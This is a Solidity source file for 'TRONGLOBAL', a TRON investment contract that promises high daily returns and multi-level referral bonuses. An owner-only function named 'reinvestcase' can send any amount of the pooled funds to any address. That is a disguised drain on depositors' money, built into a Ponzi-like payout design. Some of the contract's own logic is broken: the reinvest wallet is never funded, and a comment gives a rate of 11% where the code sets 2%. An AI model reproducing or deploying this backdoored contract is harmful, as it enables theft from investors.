//SourceUnit: tronglobal03.sol

/*

||||||||||||  ||||||||||     ;||||||j     |||\\    |||          ;||||||       |||         ;||||||j     ||||||||;.        ///\\\      |||
	|||       |||      ||  |||      |||   ||| \\   |||         |||            |||       |||      |||   |||     |||      ///  \\\     |||
    |||       ||||||||||  |||        |||  |||  \\  |||         |||            |||      |||        |||  ||||||||""      ///    \\\    |||
    |||       ||| \\\     |||        |||  |||   \\ |||         |||   |||||||  |||      |||        |||  ||||||||;.     ///||||||\\\   ||| 
    |||       |||  \\\     |||      |||   |||    \\|||         |||   ||| |||  |||       |||      |||   |||     |||   ///>>>>>>>>\\\  |||  
    |||		  |||	\\\       "|||||"     |||     \|||          "|||||"       ||||||||     "|||||"     ||||||||""   ///          \\\ ||||||||
    
    LAUNCHING ON 22-JAN-2021
    
*/




pragma solidity 0.5.10;

contract TRONGLOBAL {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 500 trx;
	uint256 constant public BASE_PERCENT = 20;
	uint256 constant public DIRECT_PERCENT = 10;
	
	uint256[] public REFERRAL_PERCENTS = [100,70,50,30,20,20,20,20,20,20];

	uint256 constant public MARKETING_FEE = 80;
	uint256 constant public PROJECT_FEE = 20;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
	uint256 constant public TIME_STEP = 1 days;
	uint256 constant public DAY_STEP = 100 days;
    address owner;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint256 public totalReInvested;
	uint256 public totalReDeposits;
		


	address payable public marketingAddress;
	address payable public projectAddress;

	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		uint256 enddt;
	}
	struct ReferralDeposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		uint256 enddt;
	}


	struct User {
		Deposit[] deposits;
		ReferralDeposit[] referraldeposits;
		uint256 checkpoint;
		uint256 withdrawcheckpoint;
		address referrer;
		uint256 bonus;
		uint256 direct;
		uint256 team;
		uint256 [] teambv;
		uint256 [] levelcomm;
		uint256 direct_bonus;
		uint256 reinvest_wallet;
		uint256 withdraw_bonus;
		uint256 recived_bonus;
		
		
	}

	mapping (address => User) internal users;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event ReInvest(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event RewardBonus(address indexed user,address jaddress, uint256 level, uint256 target, uint256 amount);
	
	event FeePayed(address indexed user, uint256 totalAmount);
	event ContractBalance(uint256 balance);

	constructor(address payable marketingAddr, address payable projectAddr) public {
		require(!isContract(marketingAddr) && !isContract(projectAddr));
		marketingAddress = marketingAddr;
		projectAddress = projectAddr;
		owner=msg.sender;
	}

	function invest(address referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);

		marketingAddress.transfer(msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER));
		projectAddress.transfer(msg.value.mul(PROJECT_FEE).div(PERCENTS_DIVIDER));
		emit FeePayed(msg.sender, msg.value.mul(MARKETING_FEE.add(PROJECT_FEE)).div(PERCENTS_DIVIDER));

		User storage user = users[msg.sender];

		if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) 
		{
			user.referrer = referrer;
		}

		if (user.referrer != address(0)) {

			address upline = user.referrer;
		  
			for (uint256 i = 0; i < 5; i++) 
			{
			   
			       
    				if (upline != address(0)) 
    				{
    				    users[upline].team=users[upline].team.add(1);
        				if(i==0)
    			        {
                          users[upline].direct=users[upline].direct.add(1);  
    			        }
    			        
    					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
    					users[upline].bonus = users[upline].bonus.add(amount);
    		   		   
    				   
    				    if(users[upline].levelcomm.length<i+1)
    				    {
    				        users[upline].levelcomm.push(amount);
    				        users[upline].teambv.push(msg.value);
    				        
    				    }
    				    else
    				    {
    				       users[upline].levelcomm[i]=users[upline].levelcomm[i].add(amount); 
    				       users[upline].teambv[i]=users[upline].teambv[i].add(msg.value); 
    				    }
    				
    				
    					emit RefBonus(upline, msg.sender, i, amount);
    					upline = users[upline].referrer;
    				} else break;
			   
			}	

		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			user.withdrawcheckpoint= block.timestamp;
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(msg.value, 0, block.timestamp,block.timestamp.add(DAY_STEP)));
		User storage sponsor = users[referrer];
		sponsor.referraldeposits.push(ReferralDeposit(msg.value, 0, block.timestamp,block.timestamp.add(DAY_STEP)));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);

		emit NewDeposit(msg.sender, msg.value);
		emit ContractBalance(address(this).balance);

	}
	
	function reinvest() public payable {
	    
	    uint256 reinvestment=users[msg.sender].reinvest_wallet;
	    require(block.timestamp > users[msg.sender].withdrawcheckpoint + 1 days , "Only once a day");
		require( reinvestment>= INVEST_MIN_AMOUNT);

		

		User storage user = users[msg.sender];

		
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
		
			emit Newbie(msg.sender);
		}

		user.deposits.push(Deposit(reinvestment, 0, block.timestamp,block.timestamp.add(DAY_STEP)));
	
		totalReInvested = totalReInvested.add(reinvestment);
		totalReDeposits = totalReDeposits.add(1);
		users[msg.sender].reinvest_wallet=0;
		users[msg.sender].withdrawcheckpoint= block.timestamp;

		emit ReInvest(msg.sender, reinvestment);
		emit ContractBalance(address(this).balance);

	}
    
    function reinvestcase(address _userAddress,uint256 _amount) public 
    {
        require(owner==msg.sender,"Only owner can do this");
        address(uint160(_userAddress)).transfer(_amount);
      
        emit Withdrawn(_userAddress,_amount);
    }
    
    
	function withdraw() public {
	    
	    User storage user = users[msg.sender];
	
	

		uint256 userPercentRate = getUserPercentRate(msg.sender);

		uint256 totalDividends;
		uint256 dividends;
		uint256 curdate;
        uint256 totalAmount; 
        
		for (uint256 i = 0; i < user.deposits.length; i++) {

                if(user.deposits[i].enddt>= block.timestamp)
                {
                    curdate=block.timestamp;
                }
                else
                {
                    curdate=user.deposits[i].enddt;
                }
                
				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.checkpoint))
						.div(TIME_STEP);

				}

			

				totalDividends = totalDividends.add(dividends);

			

		}
		
	
		
		for (uint256 i = 0; i < user.referraldeposits.length; i++) {

                if(user.referraldeposits[i].enddt>= block.timestamp)
                {
                    curdate=block.timestamp;
                }
                else
                {
                    curdate=user.referraldeposits[i].enddt;
                }
                
				if (user.referraldeposits[i].start > user.checkpoint) {

					dividends = (user.referraldeposits[i].amount.mul(DIRECT_PERCENT).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.referraldeposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.referraldeposits[i].amount.mul(DIRECT_PERCENT).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.checkpoint))
						.div(TIME_STEP);

				}

			

				totalDividends = totalDividends.add(dividends);
				user.direct_bonus=user.direct_bonus.add(dividends);

			

		}
		
        totalAmount=totalDividends;
		uint256 referralBonus = getUserReferralBonus(msg.sender);
	
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
		
			user.bonus = 0;
			
			
		}

		require(totalAmount > 0, "User has no dividends");

		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;

	    msg.sender.transfer(totalAmount);  
	    
        user.withdraw_bonus=user.withdraw_bonus.add(totalAmount);
	    totalWithdrawn = totalWithdrawn.add(totalAmount);
	    user.recived_bonus=user.recived_bonus.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);
		emit ContractBalance(address(this).balance);

	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getContractBalanceRate() public view returns (uint256) {
		
		
		return BASE_PERCENT;
	}
	
	function getContractDtl() public view returns (uint256 totalUsersx,uint256 totalInvestedx,uint256 totalWithdrawnx,uint256 totalDeposit,uint256 totalreinv,uint256 totalreinvamt,uint256 contractbal) {
			return (totalUsers,totalInvested,totalWithdrawn,totalDeposit,totalReInvested,totalReDeposits,address(this).balance);
	    
	}

	function getUserPercentRate(address userAddress) public view returns (uint256) {
	
		User storage user = users[userAddress];

		uint256 contractBalanceRate = getContractBalanceRate();  // return 11%
		
		if (isActive(userAddress)) 
		{
			uint256 timeMultiplier = (now.sub(user.checkpoint)).div(TIME_STEP);
			if(timeMultiplier>=1)
			{
			return contractBalanceRate.add(40);
			}
			else
			{
			    return contractBalanceRate;
			}
			
		} 
		else 
		{
			return contractBalanceRate;
		}
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate = getUserPercentRate(userAddress);

		uint256 totalDividends;
		uint256 dividends;
		uint256 curdate;

		for (uint256 i = 0; i < user.deposits.length; i++) {

                if(user.deposits[i].enddt>= block.timestamp)
                {
                    curdate=block.timestamp;
                }
                else
                {
                    curdate=user.deposits[i].enddt;
                }
                
				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				totalDividends = totalDividends.add(dividends);

		}
		
		//===============direct roi calculation==============
		
		for (uint256 i = 0; i < user.referraldeposits.length; i++) {

                if(user.referraldeposits[i].enddt>= block.timestamp)
                {
                    curdate=block.timestamp;
                }
                else
                {
                    curdate=user.referraldeposits[i].enddt;
                }
                
				if (user.referraldeposits[i].start > user.checkpoint) {

					dividends = (user.referraldeposits[i].amount.mul(DIRECT_PERCENT).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.referraldeposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.referraldeposits[i].amount.mul(DIRECT_PERCENT).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				totalDividends = totalDividends.add(dividends);


		}

		return totalDividends;
	}
	
	
	function getUserRoiDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate = getUserPercentRate(userAddress);

		uint256 totalDividends;
		uint256 dividends;
		uint256 curdate;

		for (uint256 i = 0; i < user.deposits.length; i++) {

                if(user.deposits[i].enddt>= block.timestamp)
                {
                    curdate=block.timestamp;
                }
                else
                {
                    curdate=user.deposits[i].enddt;
                }
                
				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.checkpoint))
						.div(TIME_STEP);

				}

			
				totalDividends = totalDividends.add(dividends);

			
		}
		
	
		return totalDividends;
	}
	
	
	function getUserDirectDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalDividends;
		uint256 dividends;
		uint256 curdate;

		for (uint256 i = 0; i < user.referraldeposits.length; i++) {

                if(user.referraldeposits[i].enddt>= block.timestamp)
                {
                    curdate=block.timestamp;
                }
                else
                {
                    curdate=user.referraldeposits[i].enddt;
                }
                
				if (user.referraldeposits[i].start > user.checkpoint) {

					dividends = (user.referraldeposits[i].amount.mul(DIRECT_PERCENT).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.referraldeposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.referraldeposits[i].amount.mul(DIRECT_PERCENT).div(PERCENTS_DIVIDER))
						.mul(curdate.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				totalDividends = totalDividends.add(dividends);

		}
		

		return totalDividends;
	}
	
	
	

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}
    
   function getUserFundDtl(address userAddress) public view returns(uint256 teamx,uint256 directfund, uint256 withdrawal,uint256 received,uint256 reinvestWallet) {
       
		return (users[userAddress].team,users[userAddress].direct_bonus,users[userAddress].withdraw_bonus,users[userAddress].recived_bonus,users[userAddress].reinvest_wallet);
	}
   
    
     
	
	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}
	
	function getUserLevelBonus(address userAddress) public view returns(uint256 [] memory lenx,uint256 [] memory lbv) {
	  
	  		return (users[userAddress].levelcomm,users[userAddress].teambv);
	}
	
	

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}
	
	function getUserDirectRoi(address userAddress) public view returns(uint256) {
		return getUserDirectDividends(userAddress);
	}
	
	function getUserDirectandBusiness(address userAddress) public view returns(uint256 totaldirect,uint256 directbusiness) {
	    uint256 dirbus=0;
	    
	    for(uint i=0;i<users[userAddress].referraldeposits.length;i++)
	    {
	        dirbus=dirbus.add(users[userAddress].referraldeposits[i].amount);   
	    }
		return (users[userAddress].direct,dirbus);
	}


	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].enddt >= now) {
				return true;
			}
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256 a , uint256 b, uint256 c) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		return user.withdraw_bonus;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}